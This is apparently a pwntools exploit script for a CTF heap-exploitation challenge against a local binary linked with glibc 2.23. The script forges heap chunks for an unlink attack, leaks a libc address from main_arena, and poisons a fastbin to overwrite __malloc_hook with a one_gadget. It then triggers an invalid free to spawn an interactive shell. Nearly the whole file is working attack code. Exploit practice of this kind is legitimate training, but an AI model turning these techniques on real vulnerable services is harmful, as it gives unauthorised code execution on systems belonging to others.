#!/usr/bin/env python3

'''
    author: GeekCmore
    time: 2026-10-10 11:40:30
'''
from pwn import *

filename = "pwn_patched"
libcname = "/home/xi/.config/cpwn/pkgs/2.23-0ubuntu11.3/amd64/libc6_2.23-0ubuntu11.3_amd64/lib/x86_64-linux-gnu/libc.so.6"
host = "127.0.0.1"
port = 1337
container_id = ""
proc_name = ""
elf = context.binary = ELF(filename)
if libcname:
    libc = ELF(libcname)
gs = '''
b main
set debug-file-directory /home/xi/.config/cpwn/pkgs/2.23-0ubuntu11.3/amd64/libc6-dbg_2.23-0ubuntu11.3_amd64/usr/lib/debug
set directories /home/xi/.config/cpwn/pkgs/2.23-0ubuntu11.3/amd64/glibc-source_2.23-0ubuntu11.3_all/usr/src/glibc/glibc-2.23
'''

def start():
    if args.GDB:
        return gdb.debug(elf.path, gdbscript = gs)
    elif args.REMOTE:
        return remote(host, port)
    elif args.DOCKER:
        import docker
        from os import path
        p = remote(host, port)
        client = docker.from_env()
        container = client.containers.get(container_id=container_id)
        processes_info = container.top()
        titles = processes_info['Titles']
        processes = [dict(zip(titles, proc)) for proc in processes_info['Processes']]
        target_proc = []
        for proc in processes:
            cmd = proc.get('CMD', '')
            exe_path = cmd.split()[0] if cmd else ''
            exe_name = path.basename(exe_path)
            if exe_name == proc_name:
                target_proc.append(proc)
        idx = 0
        if len(target_proc) > 1:
            for i, v in enumerate(target_proc):
                print(f"{i} => {v}")
            idx = int(input(f"Which one:"))
        import tempfile
        with tempfile.NamedTemporaryFile(prefix = 'cpwn-gdbscript-', delete=False, suffix = '.gdb', mode = 'w') as tmp:
            tmp.write(f'shell rm {tmp.name}\n{gs}')
        print(tmp.name)
        run_in_new_terminal(["sudo", "gdb", "-p", target_proc[idx]['PID'], "-x", tmp.name])
        return p
    else:
        return process(elf.path)
context.log_level="debug"
p = start()
def add(size,connect):
    p.sendlineafter(b'>> ',b'1')
    p.sendlineafter(b'input the size\n',str(size).encode())
    p.sendafter(b'content\n',connect)
def delete():
    p.sendlineafter(b'>> ',b'2')

def show():
    p.sendlineafter(b'>> ',b'3')

def bug():
    gdb.attach(p)
    pause()

def calloc_free(xuan,connect):
    p.sendlineafter(b'>> ',b'666')
    p.sendlineafter(b'free?\n',str(xuan).encode())
    if(xuan==1):
        p.sendafter(b'content\n',connect)
    
# Your exploit here

p.recvuntil(b'username:')
p.send(p64(0)*3+p64(0x41))

p.recvuntil(b'info:')
p.send(p64(0)*2+p64(0x40)+p64(0x41))

add(0x68,b'a'*0x58)
delete()
add(0x28,b'a'*0x18)
delete()
add(0x58,b'b'*0x58)
delete()
add(0x48,b'a'*0x20+p64(0x90)+p64(0x31))
delete()

add(0x80,p64(0x30)+p64(0x21))

add(0x58,b'h'*0x58)
delete()

p.sendline(b'1'*0x400)


payload=p64(0)+p64(0x91)+p64(0x602098-0x18)+p64(0x602098-0x10)
payload=payload.ljust(0x90,b'\x00')+p64(0x90)+p64(0x90)
calloc_free(1,payload)



delete()

calloc_free(2,b'')

add(0x38, p64(0) + p64(0x602080) + p64(0xdeadbeefdeadbeef))
delete()


add(0x80,b'a')
delete()

show()

# show 后 close(1)/close(2)，后面盲发
leak = u64(p.recv(6).ljust(8, b'\x00'))
libc_addr = leak - 0x3c4b78  # main_arena+88
print("libc_addr:", hex(libc_addr))

# one: 0xf03a4 / 0x4527a / 0xf1247；add 栈过不了，最后用 free 触发
one_off = int(args.one, 16) if args.one else 0xf03a4
one = libc_addr + one_off
malloc_hook = libc_addr + libc.sym['__malloc_hook']
print("malloc_hook:", hex(malloc_hook))
print("one:", hex(one))




p.sendline(b'1')
p.sendline(str(0x20).encode())
p.send(b'a'*0x10)

p.sendline(b'1')
p.sendline(str(0x60).encode())
p.send(b'a')

p.sendline(b'2')

p.sendline(b'1')
p.sendline(str(0x80).encode())
p.send(b'a'*0x80)

# fd = malloc_hook-0x23
p.sendline(b'1')
p.sendline(str(0x80).encode())
p.send(b'\x07'*0x30 + p64(0) + p64(0x71) + p64(malloc_hook - 0x23))

p.sendline(b'1')
p.sendline(str(0x60).encode())
p.send(b'a')

# pad 0x13 写 __malloc_hook = one
p.sendline(b'1')
p.sendline(str(0x60).encode())
p.send(b'a'*0x13 + p64(one))

bug()
# 非法 free → malloc_printerr → malloc → one
p.sendline(b'2')

p.interactive()